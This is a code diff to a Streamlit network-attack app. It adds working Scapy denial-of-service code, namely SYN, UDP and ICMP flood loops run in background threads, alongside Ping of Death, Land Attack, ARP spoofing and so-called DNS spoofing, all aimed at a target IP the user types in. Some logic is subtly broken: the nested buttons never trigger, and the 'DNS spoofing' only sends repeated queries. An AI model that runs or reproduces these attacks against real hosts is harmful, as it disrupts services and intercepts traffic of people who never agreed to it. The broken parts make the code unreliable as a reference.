@@ -5,6 +5,8 @@ import re
 import random
 import threading
 from tabulate import tabulate
+import socket
+import time
 
 
 # Port details with names, protocols, and descriptions
@@ -62,6 +64,33 @@ def load_css(file_name):
 
     # Load the CSS file
 load_css("ui/Style.css")
+
+# Initialize a global variable to control the attack threads
+attack_running = False
+stop_event = threading.Event()
+
+def start_syn_flood(target_ip):
+    global attack_running
+    attack_running = True
+    while attack_running:
+        send(IP(dst=target_ip)/TCP(sport=12345, dport=80, flags="S"), verbose=1)
+
+def start_udp_flood(target_ip):
+    global attack_running
+    attack_running = True
+    while attack_running:
+        send(IP(dst=target_ip)/UDP(sport=12345, dport=53), verbose=1)
+
+def start_icmp_flood(target_ip):
+    global attack_running
+    attack_running = True
+    while attack_running:
+        send(IP(dst=target_ip)/ICMP(), verbose=1)
+
+def stop_attacks():
+    global attack_running
+    attack_running = False
+    st.success("Attack stopped. 🛑")
 
 # Function to execute ARP MitM attack
 def arp_mitm(target1, target2):
@@ -763,46 +792,150 @@ else:
         
         # Informative Description
         st.write("""
-        **What are Classical Attacks?**  
-        Classical attacks are traditional methods of exploiting vulnerabilities in network protocols and systems. They are often used in penetration testing to demonstrate how easily a system can be compromised. This section allows you to simulate two well-known classical attacks: the **Ping of Death** and the **Land Attack**.
+        ***What are Classical and Advanced Network Attacks? 🔐***
 
-        **Workflow of Classical Attacks:**  
-        1. **Select Attack Type**: Choose the type of attack you want to simulate from the dropdown menu.
-        2. **Input Target IP**: Enter the IP address of the target system you wish to attack.
-        3. **Execute Attack**: Initiate the selected attack to observe its effects on the target.
+        In cybersecurity, both **classical** and **advanced network attacks** exploit vulnerabilities within systems to test the resilience of networks. These attacks are commonly used in penetration testing to evaluate network defenses and identify potential weaknesses. This tool allows you to simulate various types of attacks for educational, testing, and training purposes.
 
-        **Uses and Purpose:**  
-        - **Security Testing**: Classical attacks are primarily used by security professionals to test the resilience of networks against these vulnerabilities.
-        - **Awareness Training**: Understanding these attacks helps administrators recognize the potential threats their systems face.
-        - **Remediation**: Identifying weaknesses allows for timely remediation and strengthening of network defenses.
+        ***Workflow of Network Attacks*** 🚧
+        1. **Select Attack Type**: Choose from a variety of attack types in the dropdown menu.
+        2. **Input Target IP**: Enter the IP address of the target machine or network you intend to test.
+        3. **Execute Attack**: Click the button to initiate the selected attack and observe its behavior.
 
-        **Types of Attacks:**
-        - **Ping of Death**:  
-        This attack involves sending a malformed ICMP packet that exceeds the maximum size, potentially causing the target system to crash or become unresponsive.  
-        **How It Works**: By fragmenting the ICMP packet into pieces larger than the allowed size, the target system may not handle the reassembly correctly, leading to a denial of service.
+        ***Purpose of Network Attacks*** 🎯
+        - **Security Testing**: These attacks help security professionals test a network's vulnerability to common threats.
+        - **Awareness Training**: System administrators can learn about potential attack vectors and how to prevent them.
+        - **Remediation**: Identifying weak points enables the implementation of appropriate countermeasures.
+
+        ---
+
+        ***Types of Attacks 🛡️***
+
+        1. **Ping of Death ☠️**
+        - **Description**: The Ping of Death attack involves sending oversized ICMP (ping) packets, which can crash or freeze the target system.
+        - **How It Works**: By sending fragmented ICMP packets that exceed the maximum size, the target system may fail to reassemble them correctly, resulting in system instability or failure.
+        - **Usage**: Primarily used to test a system's resilience against malformed packets.
+
+        2. **Land Attack 🕷️**
+        - **Description**: A Land Attack sends a TCP packet where the source and destination IP addresses are the same, confusing the target system and potentially causing it to crash.
+        - **How It Works**: The system receives a packet that appears to originate from itself, which can result in a denial-of-service (DoS).
+        - **Usage**: This attack tests how the target handles improper source and destination addressing.
+
+        ---
+
+        ***Advanced Attacks*** 💣
+
+        3. **SYN Flood 🌊**
+        - **Description**: A SYN Flood attack involves sending multiple SYN packets without completing the TCP handshake, causing the server to allocate resources and eventually leading to exhaustion.
+        - **How It Works**: By continuously initiating half-open connections, the server's resources are consumed, potentially leading to denial-of-service (DoS).
+        - **Usage**: This is a common attack for testing how well a server can handle large volumes of connection requests.
+
+        4. **UDP Flood 🚀**
+        - **Description**: A UDP Flood attack sends large volumes of UDP packets to random ports on a target, overwhelming its ability to process incoming requests.
+        - **How It Works**: The target system tries to handle the incoming traffic but can be overwhelmed, resulting in service disruption.
+        - **Usage**: This attack tests a network's ability to handle unsolicited UDP traffic.
+
+        5. **ICMP Flood 🌩️**
+        - **Description**: This attack involves sending a high volume of ICMP echo requests (pings) to the target, flooding it with network traffic.
+        - **How It Works**: The target system becomes overwhelmed by processing multiple ICMP requests, potentially leading to a denial-of-service.
+        - **Usage**: Use this attack to test the target's ability to manage excessive ping requests.
+
+        ---
+
+        ***ARP and DNS Spoofing Attacks*** 🎭
+
+        6. **ARP Spoofing 👾**
+        - **Description**: ARP Spoofing allows an attacker to intercept and modify traffic between two systems by poisoning the ARP cache.
+        - **How It Works**: The attacker sends falsified ARP responses, tricking the network into routing traffic through the attacker’s machine, allowing for man-in-the-middle (MitM) attacks.
+        - **Usage**: Useful for penetration testing to see how easily an attacker can intercept traffic on a local network.
+
+        7. **DNS Spoofing 📡**
+        - **Description**: DNS Spoofing redirects a target’s DNS requests to malicious IP addresses, allowing attackers to control the victim's browsing behavior.
+        - **How It Works**: By forging DNS responses, the attacker can redirect users from legitimate websites to malicious sites, facilitating phishing and other attacks.
+        - **Usage**: Used to test how secure a DNS infrastructure is against tampering.
+
+        ---
+
+        ### Important Considerations 📝
+        - **Permissions**: These attacks may require elevated privileges. On Linux/macOS, use `sudo`; on Windows, run as Administrator.
         
-        - **Land Attack**:  
-        A Land Attack sends a packet to a target with both the source and destination IP addresses set to the same value. This can confuse the target and may lead to a denial-of-service condition.  
-        **How It Works**: The target system receives a packet that seems to originate from itself, which can cause it to malfunction or crash.
+        - **Stopping Flood Attacks**: Flooding attacks (such as SYN Flood, UDP Flood, and ICMP Flood) run in loops. To stop them, you must manually interrupt the process by halting the Streamlit server (Ctrl + C).
 
-        **Important Note**:  
-        These attacks are for educational and testing purposes only. Ensure that you have permission to test any network or system you are targeting.
+        - **Legal Disclaimer**: Ensure you have explicit permission before testing any network or system. Unauthorized use of these techniques is both illegal and unethical.
+
+        Happy Testing, and stay secure! 🔐
         """)
+        st.divider()
+
 
         # User Input for Attack Execution
-        attack_type = st.selectbox("Select Attack Type", ["None", "Ping of Death ☠️", "Land Attack ⚠️"])
+        attack_type = st.selectbox("Select Attack Type", [
+            "None",
+            "Ping of Death ☠️",
+            "Land Attack 🕷️",
+            "SYN Flood 🌊",
+            "UDP Flood 🚀",
+            "ICMP Flood 🌩️",
+            "ARP Spoofing 👾",
+            "DNS Spoofing 📡"
+        ])
+
         target_ip = st.text_input("Target IP", "10.0.0.5")
-        
+        conf.verb = 1  # Set Scapy verbose mode
+
         if st.button("Execute Attack"):
-            if attack_type == "Ping of Death":
+            # Validate IP address
+            try:
+                socket.inet_aton(target_ip)  # Check if it's a valid IP address
+            except socket.error:
+                st.error("Invalid IP address format! ❌ Please enter a valid IP.")
+                st.stop()
+
+            # Execute selected attack
+            if attack_type == "Ping of Death ☠️":
+                st.write("Executing Ping of Death attack... 🐾")
                 send(fragment(IP(dst=target_ip)/ICMP()/("X"*60000)))
                 st.success("Ping of Death attack sent. 💥")
-            elif attack_type == "Land Attack":
+
+            elif attack_type == "Land Attack 🕷️":
+                st.write("Executing Land Attack... 🔥")
                 send(IP(src=target_ip, dst=target_ip)/TCP(sport=135, dport=135))
                 st.success("Land attack sent. 🔥")
+
+            elif attack_type == "SYN Flood 🌊":
+                st.write("Executing SYN Flood attack... 🌊")
+                threading.Thread(target=start_syn_flood, args=(target_ip,), daemon=True).start()
+                st.success("SYN Flood attack initiated. 🌊")
+
+            elif attack_type == "UDP Flood 🚀":
+                st.write("Executing UDP Flood attack... 🚀")
+                threading.Thread(target=start_udp_flood, args=(target_ip,), daemon=True).start()
+                st.success("UDP Flood attack initiated. 🚀")
+
+            elif attack_type == "ICMP Flood 🌩️":
+                st.write("Executing ICMP Flood attack... 🌩️")
+                threading.Thread(target=start_icmp_flood, args=(target_ip,), daemon=True).start()
+                st.success("ICMP Flood attack initiated. 🌩️")
+
+            elif attack_type == "ARP Spoofing 👾":
+                gateway_ip = st.text_input("Gateway IP", "10.0.0.1")
+                if st.button("Start ARP Spoofing"):
+                    st.write("Starting ARP Spoofing...")
+                    send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst="ff:ff:ff:ff:ff:ff"), loop=1, verbose=0)
+                    st.success("ARP Spoofing initiated! 👾")
+
+            elif attack_type == "DNS Spoofing 📡":
+                dns_target = st.text_input("DNS Target IP", "8.8.8.8")
+                if st.button("Start DNS Spoofing"):
+                    st.write("Starting DNS Spoofing...")
+                    send(IP(dst=dns_target)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="example.com", qtype="A")), loop=1, verbose=0)
+                    st.success("DNS Spoofing initiated! 📡")
+
             else:
                 st.warning("Select a valid attack type. ❗")
 
+        # Button to stop all attacks
+        if st.button("Stop Attack Immediately 🛑"):
+            stop_attacks()
 
     # ARP Cache Poisoning Section
     elif section == "📡 ARP Cache Poisoning":
